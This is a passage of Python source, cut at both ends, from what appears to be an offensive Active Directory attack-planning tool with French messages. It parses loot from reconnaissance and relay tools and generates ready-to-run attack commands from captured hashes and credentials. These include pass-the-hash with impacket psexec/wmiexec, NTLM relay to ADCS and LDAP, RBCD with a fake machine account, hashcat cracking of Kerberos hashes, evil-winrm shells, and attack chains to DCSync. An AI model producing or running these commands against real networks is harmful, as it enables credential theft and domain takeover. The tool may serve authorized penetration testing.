            if _hm.group(2) not in ("aad3b435b51404eeaad3b435b51404ee",):
                pth_hashes.append((_hm.group(1), _hm.group(2)))

    # ── LDAP delegations ────────────────────────────────────────────────────
    unconstrained_users: list[str] = []
    unc_f = out_dir / "ldap_unconstrained_delegation.txt"
    if unc_f.exists():
        for ln in safe_read_text(unc_f, 8000).splitlines():
            _m = re.search(r"sAMAccountName:\s+(\S+)", ln)
            if _m:
                unconstrained_users.append(_m.group(1))

    constrained_map: list[tuple[str, str]] = []
    con_f = out_dir / "ldap_constrained_delegation.txt"
    if con_f.exists():
        _cur = ""
        for ln in safe_read_text(con_f, 8000).splitlines():
            _m = re.search(r"sAMAccountName:\s+(\S+)", ln)
            if _m:
                _cur = _m.group(1)
            _ms = re.search(r"msDS-AllowedToDelegateTo:\s+(\S+)", ln)
            if _ms and _cur:
                constrained_map.append((_cur, _ms.group(1)))

    rbcd_candidates: list[str] = []
    rbcd_f = out_dir / "ldap_rbcd_candidates.txt"
    if rbcd_f.exists():
        for ln in safe_read_text(rbcd_f, 8000).splitlines():
            _m = re.search(r"sAMAccountName:\s+(\S+)", ln)
            if _m:
                rbcd_candidates.append(_m.group(1))

    # ── AS-REP / Kerberoast ──────────────────────────────────────────────────
    asrep_hashes_f = out_dir / "kerberos" / "asrep_hashes.txt"
    tgs_hashes_f = out_dir / "kerberos" / "tgs_hashes.txt"
    asrep_hash_count = 0
    tgs_hash_count = 0
    if asrep_hashes_f.exists():
        asrep_hash_count = safe_read_text(asrep_hashes_f, 16000).count("$krb5asrep$")
    if tgs_hashes_f.exists():
        tgs_hash_count = safe_read_text(tgs_hashes_f, 16000).count("$krb5tgs$")

    asrep_candidate_users: list[str] = []
    asrep_cand_f = out_dir / "ldap_asrep_candidates.txt"
    if asrep_cand_f.exists():
        for ln in safe_read_text(asrep_cand_f, 8000).splitlines():
            _m = re.search(r"sAMAccountName:\s+(\S+)", ln)
            if _m:
                asrep_candidate_users.append(_m.group(1))

    kerb_candidate_users: list[str] = []
    kerb_cand_f = out_dir / "ldap_kerberoastable.txt"
    if kerb_cand_f.exists():
        for ln in safe_read_text(kerb_cand_f, 8000).splitlines():
            _m = re.search(r"sAMAccountName:\s+(\S+)", ln)
            if _m:
                kerb_candidate_users.append(_m.group(1))

    # ── ADCS ────────────────────────────────────────────────────────────────
    certipy_log = out_dir / "adcs" / "certipy_find.log"
    ca_name = ""
    ca_dns  = ""   # actual CA server hostname (may differ from DC)
    adcs_esc_list: list[str] = []
    if certipy_log.exists():
        certipy_txt = safe_read_text(certipy_log, 24000)
        _m = re.search(r"CA Name\s*[:\-]\s*(.+)", certipy_txt)
        if _m:
            ca_name = _m.group(1).strip()
        # DNS Name = real hostname of the CA server
        _m = re.search(r"DNS Name\s*[:\-]\s*(\S+\.\S+)", certipy_txt)
        if _m and not _m.group(1).strip().startswith("_"):
            ca_dns = _m.group(1).strip()
        for _esc in re.finditer(r"(ESC\d+)", certipy_txt):
            if _esc.group(1) not in adcs_esc_list:
                adcs_esc_list.append(_esc.group(1))
    # also check certipy JSON output
    if not ca_dns and (out_dir / "adcs").exists():
        for _jf in (out_dir / "adcs").glob("*.json"):
            try:
                _jd = json.loads(_jf.read_text())
                _cas = _jd.get("Certificate Authorities") or {}
                for _ca_entry in (_cas.values() if isinstance(_cas, dict) else []):
                    _dns = (_ca_entry.get("DNS Name") or "").strip()
                    if _dns and not _dns.startswith("_"):
                        ca_dns = _dns; break
                if ca_dns:
                    break
            except Exception:
                pass
    # ca_target = CA server to use as certipy -target (may differ from DC)
    ca_target = ca_dns or dc

    # ── BloodyAD writable ────────────────────────────────────────────────────
    # ── BloodyAD writable — parse ACL types precisely ───────────────────────
    bloody_writable = out_dir / "bloodyad" / "writable.txt"
    bloody_detail_f = out_dir / "bloodyad" / "writable_detail.txt"
    bloody_maq_f = out_dir / "bloodyad" / "maq.txt"
    bloody_shadow_f = out_dir / "bloodyad" / "shadow_creds.txt"
    bloody_trusts_f = out_dir / "bloodyad" / "trusts.txt"
    has_rbcd_write = False
    machine_account_quota = -1
    domain_trusts: list[str] = []
    # {obj_name: [acl_type, ...]}
    acl_map: dict[str, list[str]] = {}
    _ACL_TYPES = ("GenericAll", "WriteDacl", "WriteOwner", "ForceChangePassword",
                  "AddMember", "GenericWrite", "AllExtendedRights", "WriteProperty",
                  "Self", "msDS-AllowedToActOnBehalfOfOtherIdentity")
    for _bf in [bloody_writable, bloody_detail_f]:
        if _bf and _bf.exists():
            _cur_obj = ""
            for ln in safe_read_text(_bf, 16000).splitlines():
                # detect object line: "dn: ..." or "distinguishedName: ..." or sAMAccountName
                _mo = re.search(r"(?:^dn:|sAMAccountName:)\s*(\S+)", ln, re.IGNORECASE)
                if _mo:
                    _cur_obj = _mo.group(1).strip().rstrip(",")
                # detect ACL type on same or following line
                for _at in _ACL_TYPES:
                    if _at.lower() in ln.lower():
                        if _cur_obj:
                            acl_map.setdefault(_cur_obj, [])
                            if _at not in acl_map[_cur_obj]:
                                acl_map[_cur_obj].append(_at)
                        if _at == "msDS-AllowedToActOnBehalfOfOtherIdentity":
                            has_rbcd_write = True
    # legacy fallback: parse object + attribute writes from bloodyAD output
    _SECURITY_ATTRS = {
        "msds-allowedtoactonbehalfofotheridentity", "msds-keycredentiallink",
        "serviceprincipalname", "member", "useraccount", "useraccountcontrol",
        "scriptpath", "homedirectory", "profilepath", "pwdlastset",
        "allowedroasttingauthenticationpolicy", "genericall", "genericwrite",
        "writedacl", "writeowner", "forcechangepassword", "addmember",
        "allextendedright", "msds-groupmsamembership",
    }
    if not acl_map and bloody_writable.exists():
        _cur_obj2 = ""
        _obj_attrs: dict[str, list[str]] = {}
        for ln in safe_read_text(bloody_writable, 12000).splitlines():
            # object line
            _mo2 = re.search(r"(?:^dn:|sAMAccountName:)\s*(\S+)", ln, re.IGNORECASE)
            if _mo2:
                _cur_obj2 = _mo2.group(1).strip().rstrip(",")
                continue
            # attribute/ACL line with WRITE
            if _cur_obj2 and ("WRITE" in ln or "GenericAll" in ln):
                _attr = ln.strip().split(":")[0].strip().lower().rstrip(":")
                _obj_attrs.setdefault(_cur_obj2, [])
                _obj_attrs[_cur_obj2].append(_attr)
        # only keep objects with security-relevant writable attrs
        for _obj2, _attrs in _obj_attrs.items():
            _sec = [a for a in _attrs if a in _SECURITY_ATTRS]
            if _sec:
                acl_map[_obj2] = [a.title().replace("-","") for a in _sec[:3]]
            elif len(_attrs) >= 4:
                # many writable attrs = likely GenericWrite
                acl_map[_obj2] = ["GenericWrite"]
    acl_targets = list(acl_map.keys())
    # machine account quota
    if bloody_maq_f.exists():
        _maq_txt = safe_read_text(bloody_maq_f, 2000)
        _maq_m = re.search(r"ms-DS-MachineAccountQuota:\s*(\d+)", _maq_txt, re.IGNORECASE)
        if _maq_m:
            machine_account_quota = int(_maq_m.group(1))
    # shadow credentials already set
    shadow_creds_set = False
    if bloody_shadow_f.exists():
        _sc_txt = safe_read_text(bloody_shadow_f, 4000)
        shadow_creds_set = bool(re.search(r"msDS-KeyCredentialLink:\s+\S", _sc_txt))
    # domain trusts
    if bloody_trusts_f.exists():
        for ln in safe_read_text(bloody_trusts_f, 4000).splitlines():
            _tm = re.search(r"trustPartner:\s*(\S+)", ln, re.IGNORECASE)
            if _tm:
                domain_trusts.append(_tm.group(1))

    # ── SMB signing / relay ──────────────────────────────────────────────────
    smb_signing_off = False
    signing_f = out_dir / "attack_checks" / "smb_signing_check.txt"
    if signing_f.exists():
        if re.search(r"signing.*false|signing.*disabled|SMB signing is not required", safe_read_text(signing_f, 4000), re.IGNORECASE):
            smb_signing_off = True
    if summary.get("smb_signing") in ("désactivé", "disabled", "False", False):
        smb_signing_off = True

    # ── Password policy ──────────────────────────────────────────────────────
    lockout_threshold = 0
    passpol_f = out_dir / "ldap_passpol.txt"
    if passpol_f.exists():
        for ln in safe_read_text(passpol_f, 4000).splitlines():
            _m = re.search(r"lockoutThreshold:\s*(\d+)", ln)
            if _m:
                lockout_threshold = int(_m.group(1))

    # ── BloodHound zip ───────────────────────────────────────────────────────
    bh_zip: list[Path] = []
    bh_dir = out_dir / "bloodhound"
    if bh_dir.exists():
        bh_zip = sorted([_p for _p in bh_dir.glob("*.zip") if _p.stat().st_size > 0], key=lambda _p: _p.stat().st_mtime, reverse=True)
    bloodhound_gc_issue = False
    bloodhound_partial = False
    bloodhound_mode = ""
    bloodhound_log = out_dir / "bloodhound_collect.txt"
    if bloodhound_log.exists():
        _bh_txt = safe_read_text(bloodhound_log, 24000)
        bloodhound_gc_issue = bool(re.search(r"LDAPSocketOpenError|gc_connect|GC LDAP server|Connection timed out", _bh_txt, re.IGNORECASE))
        bloodhound_partial = bool(re.search(r"Trusts,Container|mode=Trusts,Container|mode=DCOnly", _bh_txt, re.IGNORECASE))
        _bh_mode = re.search(r"mode=([A-Za-z,]+)", _bh_txt)
        if _bh_mode:
            bloodhound_mode = _bh_mode.group(1)

    # ── AdminCount ───────────────────────────────────────────────────────────
    admincount_users: list[str] = []
    admincount_f = out_dir / "ldap_admincount.txt"
    if admincount_f.exists():
        for ln in safe_read_text(admincount_f, 8000).splitlines():
            _m = re.search(r"sAMAccountName:\s+(\S+)", ln)
            if _m:
                admincount_users.append(_m.group(1))

    # ── NTP ─────────────────────────────────────────────────────────────────
    ntp_skew_warn = False
    ntp_f = out_dir / "attack_checks" / "ntp_sync.txt"
    if ntp_f.exists():
        _m_off = _parse_ntp_offset(safe_read_text(ntp_f, 2000))
        if _m_off is not None and abs(_m_off) > 240:
            ntp_skew_warn = True

    # ── Coercion / capture / relay ─────────────────────────────────────────
    coercer_f = out_dir / "attack_checks" / "coercer.txt"
    coerce_vulns: list[str] = []
    coerce_success: list[str] = []
    if coercer_f.exists():
        _co_txt = safe_read_text(coercer_f, 16000)
        for _m in re.finditer(r"VULNERABLE,\s*([A-Za-z0-9_-]+)", _co_txt):
            _v = _m.group(1).strip()
            if _v not in coerce_vulns:
                coerce_vulns.append(_v)
        for _m in re.finditer(r"Exploit Success,\s*([^\r\n]+)", _co_txt):
            _v = _m.group(1).strip()
            if _v not in coerce_success:
                coerce_success.append(_v)
    responder_f = out_dir / "attack_checks" / "responder.txt"
    responder_seen = responder_f.exists() and responder_f.stat().st_size > 0
    responder_root_error = False
    if responder_seen:
        responder_root_error = "must be run as root" in safe_read_text(responder_f, 4000).lower()
    ntlmrelay_logs = [out_dir / "attack_checks" / "ntlmrelayx.txt", out_dir / "attack_checks" / "ntlmrelayx_relay.txt"]
    ntlmrelay_seen = any(_f.exists() and _f.stat().st_size > 0 for _f in ntlmrelay_logs)
    ntlmrelay_errors: list[str] = []
    for _f in ntlmrelay_logs:
        if not _f.exists():
            continue
        _txt = safe_read_text(_f, 10000)
        if "must be run as root" in _txt.lower():
            ntlmrelay_errors.append("ntlmrelayx lancé sans privilèges root")
        if re.search(r"error:\s+unrecognized arguments:", _txt, re.IGNORECASE):
            _em = re.search(r"error:\s+([^\r\n]+)", _txt, re.IGNORECASE)
            ntlmrelay_errors.append(_em.group(1).strip() if _em else "arguments ntlmrelayx incompatibles")
        if "address already in use" in _txt.lower():
            ntlmrelay_errors.append("port déjà occupé pour ntlmrelayx")

    # ════════════════════════════════════════════════════════════════════════
    # CURRENT STATE
    # ════════════════════════════════════════════════════════════════════════
    if coerce_vulns:
        add("current_state", f"Coercition validée sur le DC: {', '.join(coerce_vulns[:4])}.")
    if coerce_success:
        add("current_state", f"Primitives de coercition ayant déjà renvoyé 'Exploit Success': {', '.join(coerce_success[:4])}.")
    if responder_seen and not responder_root_error:
        add("current_state", "Responder a déjà été lancé depuis l'UI: prêt pour capture NTLMv2 si la coercition est relancée.")
    if ntlmrelay_seen and not ntlmrelay_errors:
        add("current_state", "ntlmrelayx a déjà été invoqué depuis l'UI: privilégier LDAP/LDAPS/ADCS plutôt qu'un relay SMB sur le DC.")
    if smb_signing_off:
        add("current_state", "SMB signing non requis: relay SMB potentiellement exploitable sur les hôtes compatibles.")
    else:
        add("current_state", "SMB signing requis sur le DC: éviter smb://DC pour le relay, viser plutôt LDAP/LDAPS/ADCS.")
    if bloodhound_gc_issue:
        add("current_state", "BloodHound est freiné par le Global Catalog LDAP (3268/3269 inaccessible ou filtré).")
    if bloodhound_partial:
        add("current_state", f"Collecte BloodHound partielle détectée{f' ({bloodhound_mode})' if bloodhound_mode else ''}.")
    for item in anomaly_items[:2]:
        add("current_state", f"Faiblesse détectée: {item.get('text','')}", item.get("path", ""))
    for item in bh_review_items[:2]:
        add("current_state", f"BloodHound auto-review: {item.get('text','')}", item.get("path", ""))
    for item in loot_hunt_items[:2]:
        add("current_state", f"Fichier looté suspect: {item.get('path','')}", item.get("path", ""))

    # ════════════════════════════════════════════════════════════════════════
    # DECISION NOW
    # ════════════════════════════════════════════════════════════════════════
    if admin_hash:
        add_decision(
            "Pass-the-Hash immédiat sur le DC",
            "Le loot contient déjà le hash NTLM d'Administrator. C'est le chemin le plus direct et le plus rentable à ce stade.",
            [
                f"impacket-psexec -hashes ':{admin_hash}' '{dom}/Administrator@{ip}'",
                f"impacket-wmiexec -hashes ':{admin_hash}' '{dom}/Administrator@{ip}'",
            ],
            "critical",
        )
    elif pth_hashes:
        _pu, _ph = pth_hashes[0]
        add_decision(
            "Réutiliser le meilleur hash NTLM déjà extrait",
            f"Un hash exploitable est déjà présent dans le loot ({_pu}). Inutile de repartir sur de la collecte tant que ce PTH n'a pas été tenté.",
            [
                f"impacket-wmiexec -hashes ':{_ph}' '{dom}/{_pu}@{ip}'",
                f"impacket-psexec -hashes ':{_ph}' '{dom}/{_pu}@{ip}'",
            ],
            "critical",
        )
    elif coerce_success and ca_name:
        add_decision(
            "Transformer la coercition en relay AD CS",
            f"La coercition fonctionne déjà et une CA '{ca_name}' est présente. C'est la meilleure conversion de signal NTLM en accès durable.",
            [
                f"sudo impacket-ntlmrelayx -t 'http://{ca_target}/certsrv/certfnsh.asp' --adcs --template DomainController",
                "sudo responder -I ATTACKER_IFACE -A",
            ],
            "critical",
        )
    elif coerce_success and not smb_signing_off:
        add_decision(
            "Relayer NTLM vers LDAP ou LDAPS",
            "Le DC répond à la coercition, mais le SMB signing bloque le relay SMB direct. LDAP/LDAPS est le pivot logique.",
            [
                f"sudo impacket-ntlmrelayx -t ldap://{ip} --delegate-access",
                f"sudo impacket-ntlmrelayx -t ldaps://{ip} --delegate-access",
                "sudo responder -I ATTACKER_IFACE -A",
            ],
            "critical",
        )
    elif coerce_success and smb_signing_off:
        add_decision(
            "Enchaîner capture ou relay SMB",
            "La coercition a déjà réussi et le SMB signing n'est pas requis. Le loot indique une fenêtre favorable au NTLM relay classique.",
            [
                "sudo responder -I ATTACKER_IFACE -A",
                f"sudo impacket-ntlmrelayx -t smb://{ip} -smb2support",
            ],
            "high",
        )
    elif adcs_esc_list and auth_user:
        add_decision(
            "Exploiter ADCS avec les credentials valides",
            f"Le loot contient à la fois un compte valide ({auth_user}) et des chemins ADCS ({', '.join(adcs_esc_list[:3])}).",
            [
                f"certipy find -u '{_u()}@{dom}' -p '{_p()}' -dc-ip '{ip}' -target '{ca_target}' -ns '{ip}' -vulnerable -stdout",
                f"certipy req -u '{_u()}@{dom}' -p '{_p()}' -dc-ip '{ip}' -target '{ca_target}' -ca '{ca_name or '<CA_NAME>'}' -template 'User' -upn 'Administrator@{dom}'",
            ],
            "high",
        )
    elif has_rbcd_write and machine_account_quota > 0 and auth_user:
        add_decision(
            "Monter une RBCD avec ajout de machine",
            "Les ACL et le quota machine indiquent qu'une RBCD est probablement jouable avec les éléments déjà présents dans le loot.",
            [
                f"impacket-addcomputer '{dom}/{_u()}:{_p()}' -dc-ip '{ip}' -computer-name 'FAKECMP$' -computer-pass 'Fake1234!'",
                f"impacket-getST '{dom}/FAKECMP$:Fake1234!' -dc-ip '{ip}' -spn 'cifs/{dc}' -impersonate Administrator",
            ],
            "high",
        )
    elif asrep_hash_count > 0:
        add_decision(
            "Craquer immédiatement les hashes AS-REP déjà récupérés",
            "Le loot contient déjà des matériaux d'attaque. Le gain le plus rapide est de transformer ces hashes en mot de passe.",
            [
                f"hashcat -m 18200 '{out_dir}/kerberos/asrep_hashes.txt' /usr/share/wordlists/rockyou.txt --force -O",
            ],
            "high",
        )
    elif tgs_hash_count > 0:
        add_decision(
            "Craquer les tickets Kerberoast déjà collectés",
            "Les TGS sont déjà là ; il vaut mieux les rentabiliser avant d'ouvrir de nouvelles pistes.",
            [
                f"hashcat -m 13100 '{out_dir}/kerberos/tgs_hashes.txt' /usr/share/wordlists/rockyou.txt --force -O",
            ],
            "high",
        )
    elif winrm_ok and auth_user:
        add_decision(
            "Ouvrir un shell WinRM maintenant",
            f"Le loot confirme une authentification WinRM valide pour {auth_user}. C'est l'accès interactif le plus simple à obtenir tout de suite.",
            [
                f"evil-winrm -i '{ip}' -u '{_u()}' -p '{_p()}'",
            ],
            "high",
        )
    elif asrep_candidate_users:
        add_decision(
            "Lancer un AS-REP roast ciblé",
            "Le loot montre des comptes sans pré-auth Kerberos. C'est une collecte peu coûteuse avec forte valeur potentielle.",
            [
                f"impacket-GetNPUsers '{dom}/' -dc-ip '{ip}' -no-pass -usersfile '{out_dir}/users.txt' -outputfile '{out_dir}/kerberos/asrep_hashes.txt'",
            ],
            "medium",
        )
    elif kerb_candidate_users and auth_user:
        add_decision(
            "Lancer un Kerberoast avec le compte valide",
            "Des SPN ont été détectés et un credential valide est disponible. Le loot suggère une fenêtre de crack sur compte de service.",
            [
                f"impacket-GetUserSPNs '{dom}/{_u()}:{_p()}' -dc-ip '{ip}' -request -outputfile '{out_dir}/kerberos/tgs_hashes.txt'",
            ],
            "medium",
        )
    elif auth_user:
        add_decision(
            "Approfondir l'énumération authentifiée",
            f"Le loot contient un compte valide ({auth_user}) mais pas encore de voie d'élévation évidente. Il faut enrichir la collecte.",
            [
                f"bloodhound-python -u '{_u()}@{dom}' -p '{_p()}' --auth-method ntlm -d '{dom}' -c Trusts,Container -ns '{ip}' -dc '{dc}' --disable-autogc --zip -op 'bh_{output_key(dom)}_gcmin'",
                f"bloodhound-python -u '{_u()}@{dom}' -p '{_p()}' --auth-method ntlm -d '{dom}' -c Trusts,Container -ns '{ip}' -dc '{dc}' --dns-tcp --disable-autogc --zip -op 'bh_{output_key(dom)}_gcmin'",
                f"bloodyAD -d '{dom}' -u '{_u()}' -p '{_p()}' --host '{dc}' --dc-ip '{ip}' get writable --detail",
                f"certipy find -u '{_u()}@{dom}' -p '{_p()}' -dc-ip '{ip}' -target '{ca_target}' -ns '{ip}' -vulnerable -stdout",
            ],
            "medium",
        )
    else:
        add_decision(
            "Obtenir un premier credential exploitable",
            "Le loot ne contient pas encore d'accès confirmé. La prochaine décision doit viser l'acquisition de credentials, pas l'exploitation post-auth.",
            [
                f"kerbrute userenum -d '{dom}' --dc '{ip}' /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt",
                f"impacket-GetNPUsers '{dom}/' -dc-ip '{ip}' -no-pass -usersfile '{out_dir}/users.txt'",
            ],
            "medium",
        )

    # ════════════════════════════════════════════════════════════════════════
    # WARNINGS
    # ════════════════════════════════════════════════════════════════════════
    if ntp_skew_warn:
        add("warnings", "Décalage NTP > 4 min détecté — les tickets Kerberos risquent d'être rejetés (KRB_AP_ERR_SKEW). Synchroniser l'horloge avant tout Kerberoast/AS-REP.")
    if lockout_threshold > 0:
        add("warnings", f"Stratégie de verrouillage active ({lockout_threshold} tentatives) — limiter les sprays à {lockout_threshold - 1} essais max par compte.")
    elif lockout_threshold == 0 and passpol_f.exists():
        add("warnings", "Aucun verrouillage de compte configuré — spray de mots de passe sans risque de blocage.")
    if dcsync_f.exists() and "ERROR_DS_DRA_BAD_DN" in dcsync_txt:
        add("warnings", f"DCSync DRSUAPI échoué (ERROR_DS_DRA_BAD_DN) — utiliser le hostname du DC ({dc}) au lieu de son IP, ou -use-vss.")
    if not auth_user:
        add("warnings", "Aucun credential valide trouvé dans le loot SMB — commandes avec placeholders USER/PASS.")
    if smb_signing_off:
        add("warnings", "SMB signing désactivé — NTLM relay possible. Lancer Responder + ntlmrelayx avant tout mouvement latéral.")
    if coerce_success and not smb_signing_off:
        add("warnings", "La coercition fonctionne, mais le SMB signing du DC bloque le relay SMB direct — utiliser LDAP/LDAPS ou ADCS.")
    if bloodhound_gc_issue:
        add("warnings", "BloodHound Legacy dépend encore du Global Catalog pour certaines résolutions SID/SAM — prévoir un mode réduit ou une analyse sans BH.")
    if responder_root_error:
        add("warnings", "Responder a déjà échoué faute de privilèges root dans les anciens runs — relancer après mise à jour du backend.")
    for _err in ntlmrelay_errors[:2]:
        add("warnings", f"ntlmrelayx: {_err}.")
    for item in anomaly_items[:3]:
        if item.get("severity") in {"critical", "high"}:
            add("warnings", f"Faiblesse forte: {item.get('text','')}", item.get("path", ""))
    for item in loot_hunt_items[:3]:
        if item.get("severity") in {"critical", "high"}:
            add("warnings", f"Fichier à revoir d'urgence: {item.get('path','')}", item.get("path", ""))

    # ════════════════════════════════════════════════════════════════════════
    # TARGET ACCOUNTS
    # ════════════════════════════════════════════════════════════════════════
    for user in summary.get("user_profiles", []):
        labels = []
        roles = user.get("roles") or []
        if any("Domain Admins" in r or "Enterprise Admins" in r or "Administrators" in r for r in roles):
            labels.append("DA/EA")
        if user["name"] in kerb_candidate_users or any("Kerberoastable" in r or "Compte de service / SPN" in r for r in roles):
            labels.append("kerberoastable")
        if user["name"] in asrep_candidate_users or any("AS-REP roastable" in r for r in roles):
            labels.append("asrep")
        if any("AdminCount=1" in r for r in roles) or user["name"] in admincount_users:
            labels.append("admincount=1")
        if any("DnsAdmins" in r for r in roles):
            labels.append("DnsAdmins")
        if user["name"] in unconstrained_users:
            labels.append("délégation non contrainte")
        _spns = [s for u2, s in constrained_map if u2 == user["name"]]
        if _spns:
            labels.append(f"délégation contrainte → {', '.join(_spns[:2])}")
        if labels:
            add("target_accounts", f"{user['name']} — {', '.join(labels)}")
    for _uname in unconstrained_users:
        if not any(_uname in e for e in ops["target_accounts"]):
            add("target_accounts", f"{_uname} — délégation non contrainte")
    for _uname, _spn in constrained_map:
        if not any(_uname in e for e in ops["target_accounts"]):
            add("target_accounts", f"{_uname} — délégation contrainte → {_spn}")

    # ════════════════════════════════════════════════════════════════════════
    # PRIORITIES
    # ════════════════════════════════════════════════════════════════════════
    if pth_hashes:
        _pu, _ph = pth_hashes[0]
        add("priorities", f"Hashes NTLM disponibles via DCSync ({len(pth_hashes)} comptes) — PTH immédiat : impacket-wmiexec -hashes ':{_ph}' '{dom}/{_pu}@{ip}'")
    if admin_hash:
        add("priorities", f"Hash Administrator extrait — PTH direct : impacket-psexec -hashes ':{admin_hash}' '{dom}/Administrator@{ip}'")
    if asrep_hash_count > 0:
        add("priorities", f"{asrep_hash_count} hash(es) AS-REP collecté(s) — hashcat -m 18200 kerberos/asrep_hashes.txt /usr/share/wordlists/rockyou.txt")
    elif asrep_candidate_users:
        add("priorities", f"{len(asrep_candidate_users)} compte(s) AS-REP roastable(s) sans pré-auth — lancer GetNPUsers maintenant.")
    if tgs_hash_count > 0:
        add("priorities", f"{tgs_hash_count} ticket(s) TGS collecté(s) — hashcat -m 13100 kerberos/tgs_hashes.txt /usr/share/wordlists/rockyou.txt")
    elif kerb_candidate_users:
        add("priorities", f"{len(kerb_candidate_users)} compte(s) Kerberoastable(s) — lancer GetUserSPNs avec les credentials disponibles.")
    if has_rbcd_write:
        add("priorities", "Attribut msDS-AllowedToActOnBehalfOfOtherIdentity accessible en écriture — configurer RBCD + getST pour élévation.")
    if acl_map:
        for _obj, _types in list(acl_map.items())[:3]:
            _high = [t for t in _types if t in ("GenericAll","WriteDacl","WriteOwner","ForceChangePassword","AddMember","AllExtendedRights")]
            if _high:
                add("priorities", f"ACL critique sur '{_obj}' ({', '.join(_high)}) — exploiter via bloodyAD.")
    if machine_account_quota == 0:
        add("priorities", "ms-DS-MachineAccountQuota = 0 — RBCD via addComputer impossible. Chercher un compte machine existant compromis.")
    elif machine_account_quota > 0:
        add("priorities", f"ms-DS-MachineAccountQuota = {machine_account_quota} — création de compte machine possible pour RBCD.")
    if shadow_creds_set:
        add("priorities", "msDS-KeyCredentialLink déjà configuré sur des objets — vérifier si Shadow Credentials exploitable (certipy shadow).")
    if domain_trusts:
        add("priorities", f"Trust(s) de domaine détecté(s) : {', '.join(domain_trusts[:3])} — énumérer utilisateurs/ACL des domaines de confiance.")
    if adcs_esc_list:
        add("priorities", f"ADCS vulnérable détecté : {', '.join(adcs_esc_list)} sur CA '{ca_name}' — exploitation prioritaire.")
    elif ca_name:
        _ca_host_info = f" sur {ca_dns}" if ca_dns and ca_dns.lower() != dc.lower() else ""
        add("priorities", f"CA ADCS '{ca_name}'{_ca_host_info} présente — relancer certipy find avec credentials valides pour détecter ESC1-13.")
    if ca_dns and ca_dns.lower() != dc.lower():
        add("warnings", f"CA ADCS sur serveur dédié : {ca_dns} (≠ DC {dc}) — utiliser -target '{ca_dns}' dans toutes les commandes certipy.")
    if constrained_map:
        _cu, _cs = constrained_map[0]
        add("priorities", f"Délégation contrainte sur '{_cu}' → '{_cs}' — getST possible si le compte est compromis.")
    if unconstrained_users:
        add("priorities", f"Délégation NON contrainte sur {unconstrained_users[:2]} — capturer TGT via PrinterBug/PetitPotam.")
    if winrm_ok and auth_user:
        add("priorities", f"WinRM authentifié ({auth_user}) — accès shell direct via evil-winrm.")
    if auth_user and not pth_hashes and not asrep_hash_count and not tgs_hash_count:
        add("priorities", f"Credential valide ({auth_user}) — relancer modules avancés (BloodHound, ADCS, BloodyAD).")
    if coerce_success and not smb_signing_off:
        add("priorities", "Coercition confirmée + SMB signing requis — priorité au relay LDAP/LDAPS ou ADCS HTTP, pas au relay SMB vers le DC.")
    elif coerce_success and smb_signing_off:
        add("priorities", "Coercition confirmée + SMB signing non requis — enchaîner directement sur Responder ou ntlmrelayx.")
    if bloodhound_gc_issue:
        add("priorities", "BloodHound n'est pas la voie rapide ici — privilégier BloodyAD, LDAP ciblé, Certipy et relay NTLM.")
    for item in anomaly_items[:4]:
        if item.get("severity") in {"critical", "high"}:
            add("priorities", f"Anomalie exploitable: {item.get('text','')}", item.get("path", ""))
    for item in bh_review_items[:3]:
        if item.get("severity") in {"high", "critical", "medium"}:
            add("priorities", f"BloodHound auto: {item.get('text','')}", item.get("path", ""))
    for item in loot_hunt_items[:4]:
        add("priorities", f"Analyser {item.get('path','')} ({item.get('severity','medium')})", item.get("path", ""))

    # ════════════════════════════════════════════════════════════════════════
    # ATTACK PATHS
    # ════════════════════════════════════════════════════════════════════════
    if pth_hashes:
        add("attack_paths", f"DCSync → NTLM hash ({pth_hashes[0][0]}) → PTH wmiexec/psexec → shell SYSTEM sur {ip}.")
    if admin_hash:
        add("attack_paths", "Hash Administrator → impacket-psexec PTH → accès complet DC.")
    if asrep_hash_count > 0:
        add("attack_paths", "AS-REP hashes → hashcat rockyou → compte AD → énumération élargie ou élévation.")
    elif asrep_candidate_users:
        add("attack_paths", f"Comptes AS-REP ({', '.join(asrep_candidate_users[:3])}) → GetNPUsers → hashcat → credentials AD.")
    if tgs_hash_count > 0:
        add("attack_paths", "TGS Kerberoast → hashcat → mot de passe compte de service → mouvements latéraux.")
    elif kerb_candidate_users:
        add("attack_paths", f"SPN trouvés ({', '.join(kerb_candidate_users[:3])}) → GetUserSPNs → hashcat → pivot service.")
    for _cu, _cspn in constrained_map[:3]:
        add("attack_paths", f"Délégation contrainte : {_cu} → getST -spn '{_cspn}' → impersonation Administrator sur la cible.")
    if unconstrained_users:
        add("attack_paths", f"Délégation non contrainte ({unconstrained_users[0]}) → PrinterBug → TGT DC capturé → DCSync.")
    if has_rbcd_write:
        add("attack_paths", "RBCD configurable → addComputer + msDS-AllowedToActOnBehalfOfOtherIdentity → getST → accès machine.")
    if adcs_esc_list:
        if "ESC1" in adcs_esc_list:
            add("attack_paths", f"ADCS ESC1 ({ca_name}) → certipy req SAN=Administrator → pfx → PKINIT → TGT → DCSync.")
        if "ESC4" in adcs_esc_list:
            add("attack_paths", f"ADCS ESC4 ({ca_name}) → modifier template → ESC1 → cert Administrator.")
        if "ESC8" in adcs_esc_list:
            add("attack_paths", f"ADCS ESC8 ({ca_name}) → NTLM relay /certsrv → cert machine → Schannel.")
        for _e in adcs_esc_list:
            if _e not in ("ESC1", "ESC4", "ESC8"):
                add("attack_paths", f"ADCS {_e} détecté sur {ca_name} — consulter documentation certipy.")
    elif ca_name:
        add("attack_paths", f"CA '{ca_name}' présente — certipy find + vérifier Shadow Credentials.")
    if smb_signing_off:
        add("attack_paths", "SMB signing off → Responder + ntlmrelayx → relay NTLM → dump SAM/secrets.")
    if coerce_success and not smb_signing_off:
        add("attack_paths", "Coerce_plus → auth NTLM forcée du DC → ntlmrelayx vers LDAP/LDAPS → délégation / ajout machine / abus ADCS.")
    if coerce_success and ca_name:
        add("attack_paths", f"Coerce_plus → NTLM relay vers /certsrv sur '{ca_target}' → certificat machine / utilisateur → authentification certipy.")
    if bloodhound_gc_issue:
        add("attack_paths", "BloodHound Legacy bloqué par le GC → continuer l'attaque avec LDAP ciblé, BloodyAD, Certipy et chemins de délégation déjà identifiés.")
    _ACL_TECHNIQUE = {
        "GenericAll": "accès total → reset mdp / shadow creds / RBCD",
        "WriteDacl": "modifier les DACL → s'octroyer DCSync / ForceChangePassword",
        "WriteOwner": "devenir owner → WriteDacl → DCSync",
        "ForceChangePassword": "reset mdp sans connaître l'actuel",
        "AddMember": "ajouter compte dans le groupe → élévation directe",
        "GenericWrite": "écrire attributs → SPN (Kerberoast), logon script, msDS-KeyCredentialLink",
        "AllExtendedRights": "ForceChangePassword + autres droits étendus",
